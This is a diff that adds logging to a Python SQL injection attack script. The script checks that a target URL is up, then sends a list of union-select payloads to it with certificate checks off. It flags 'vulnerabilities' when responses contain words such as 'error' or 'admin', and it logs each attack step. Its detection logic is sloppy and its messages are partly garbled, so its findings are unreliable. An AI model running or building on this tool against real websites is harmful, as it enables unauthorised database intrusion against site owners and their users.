@@ -7,12 +7,14 @@ from datetime import datetime
 import socket
 # from database import create_database_for_Captures
 import sqlite3
+import logging
+
 
 #################################################################
 attack_type = "Union Select injection"
 #################################################################
 
-
+logging.basicConfig(filename="SQLJ.log",level=logging.DEBUG)
 
 ####################################33
 pattern = r"\berror\b"
@@ -50,6 +52,7 @@ async def union_based_SQL_inj(urls):
             req = requests.get(url=urls,verify=False)
             if req.status_code == 200:
                 ask = input(f"[{datetime.now()}]"+Fore.GREEN + f"Looks like the host is up with the url: {urls } \n Do you want to send the payload to the website according to the above payload? ")
+                logging.info(f"The host is up:{urls},Time:{datetime.now()},attack:{attack_type}")
                 
                 if ask.lower() == "y":
                     for line in sorted_payload.split("\n"):
@@ -64,6 +67,7 @@ async def union_based_SQL_inj(urls):
                         print(f"[{datetime.now()}]","|Current payload: |", line,"|with status code|:",ack.status_code,"|Attack:|",attack_type)
                         print(f"[{datetime.now()}]",Fore.GREEN + str(ack.status_code))
                         await asyncio.sleep(5)
+                        logging.info(f"Sending payload:{line} to the website:{urls},attack:{attack_type},time:{datetime.now()}")
                         if "error" in ack.text:
                             print(Fore.RED + "|Vulnerability found|:", ack.text)
                             
@@ -71,35 +75,43 @@ async def union_based_SQL_inj(urls):
                         htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE)
                         if vuln:
                             print(f"[{datetime.now()}]",Fore.RED + " | Vulnerability found: |", ack.text," | with the count of: |",len(vuln),"|Attack:|",attack_type)
+                            logging.info(f"Could find some errors in the target:{urls},Time:{datetime.now()},attack:{attack_type}")
                             await asyncio.sleep(3)
+                            
                         
                         if htmlVULN:
                             print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found|:", ack.text,"with the count of:",len(htmlVULN),"|Attack:|",attack_type)
+                            logging.info(f"Could find some errors in the target:{urls},Time:{datetime.now()},attack:{attack_type}")
                             await asyncio.sleep(3)
                         
                         word = "id" in req.text
                         errword = "error" in req.text
                         if word:
                             print(f"[{datetime.now()}]",Fore.GREEN + "|Vulnerability found|:", ack.text,"|with the count of:|",len(htmlVULN),"|Attack:|",attack_type)
+                            logging.info(f"Could find some errors in the target:{urls},Time:{datetime.now()},attack:{attack_type}")
                             await asyncio.sleep(3)
                         
                         if errword:
                             print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found|:", ack.text,"|with the count of:|",len(htmlVULN),"|Attack:|",attack_type)
+                            logging.info(f"Could find some errors in the target:{urls},Time:{datetime.now()},attack:{attack_type}")
                             await asyncio.sleep(3)
                             
                         
                             
                     if ack.status_code == 302:
                         print(f"[{datetime.now()}]","|[INFO]Could inject the injectable are to the website,keyword:|",params["username"],"|Attack:|",attack_type)
+                        logging.info(f"Could inject the injectable are to the website,keyword:{params['username']},Time:{datetime.now()},attack:{attack_type}")
                         done = True
                         
                         
                     if "Admin" in vuln or "admin" in vuln or "Admin" in ack.text or "admin" in ack.text or "Admin" in htmlVULN or "admin" in htmlVULN:
 
                         print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]Could connect to the website but did found injectable area on the website.","|Attack:|",attack_type)
+                        logging.info(f"Could connect to the website but did found injectable area on the website:{urls},Time:{datetime.now()},attack:{attack_type}")
                         
                 elif ack.status_code == 200:
                     print(f"[{datetime.now()}]",Fore.RED+"[ERROR]Could connect to the website but did not found any injectable area on the website.","|Attack:|",attack_type)
+                    logging.info(f"Could connect to the website but did not found any injectable area on the website:{urls},Time:{datetime.now()},attack:{attack_type}")
                         
                 else:
                     # continue
@@ -107,6 +119,7 @@ async def union_based_SQL_inj(urls):
                         
             else:
                 print(f"[{datetime.now()}]","[ERROR]Could not connect to the website.Host seems to be down or not available at the time","|Attack:|",attack_type)
+                
         
         # await create_database_for_Captures()
         conn = sqlite3.connect("SQLJresult.db")
@@ -124,15 +137,18 @@ async def union_based_SQL_inj(urls):
     
     except ConnectionAbortedError as e:
         print(f"[{datetime.now()}]","[ERROR]ConnectionAbortedError:",e,"|Attack:|",attack_type)
-        
+        logging.error(f"Error:{e},time:{datetime.now()}")
     except ConnectionError as e:
         print(f"[{datetime.now()}]","[ERROR]ConnectionError:",e,"|Attack:|",attack_type)
+        logging.error(f"Error:{e},time:{datetime.now()}")
         
     except ConnectionRefusedError as e:
         print(f"[{datetime.now()}]","[ERROR]ConnectionRefusedError",e,"|Attack:|",attack_type)
+        logging.error(f"Error:{e},time:{datetime.now()}")
         
     except ConnectionResetError as e:
         print(f"[{datetime.now()}]","[ERROR]ConnectionResetError:",e,"|Attack:|",attack_type)
+        logging.error(f"Error:{e},time:{datetime.now()}")
         
     except KeyboardInterrupt:
         pass
@@ -142,6 +158,7 @@ async def union_based_SQL_inj(urls):
     
     except Exception as e:
         print(f"[{datetime.now()}]",f"Error: {str(e)}","|Attack:|",attack_type)
+        logging.error(f"Error:{str(e)},time:{datetime.now()},attack:{attack_type}")
         
     # except MemoryError as e:
     #     print(f"[{datetime.now()}]",Fore.RED+"[ERROR]There is an issue with you RAM:",e)
